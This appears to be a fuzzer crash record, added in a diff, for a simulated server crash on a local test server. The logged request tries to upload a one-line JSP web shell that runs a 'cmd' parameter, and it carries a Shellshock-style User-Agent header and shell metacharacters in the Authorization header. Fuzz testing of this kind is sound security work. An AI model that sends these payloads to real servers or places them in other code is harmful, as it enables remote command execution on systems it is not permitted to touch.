@@ -1,0 +1,24 @@
+{
+  "timestamp": "2025-12-29T14:42:16.402985",
+  "crash_type": "server_crash",
+  "payload": "PUT /test.jspx?\nHeaders: {'User-Agent': '() { :; }; echo vulnerable', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'close', 'Host': '127.0.0.1:8080', 'Authorization': '{}[]|\\\\', 'Referer': 'X-HTTP2-Continuation: true', 'Content-Range': 'bytes 0-100/101', 'Content-Length': '59'}\nBody: <%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>",
+  "payload_hash": "0a147e2aea299a6e",
+  "request_method": "PUT",
+  "request_path": "/test.jspx?",
+  "request_headers": {
+    "User-Agent": "() { :; }; echo vulnerable",
+    "Accept-Encoding": "gzip, deflate",
+    "Accept": "*/*",
+    "Connection": "close",
+    "Host": "127.0.0.1:8080",
+    "Authorization": "{}[]|\\",
+    "Referer": "X-HTTP2-Continuation: true",
+    "Content-Range": "bytes 0-100/101",
+    "Content-Length": "59"
+  },
+  "request_body": "<%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>",
+  "error_message": "Simulated server_crash",
+  "stack_trace": null,
+  "fuzzer_variant": null,
+  "iteration": 435
+}
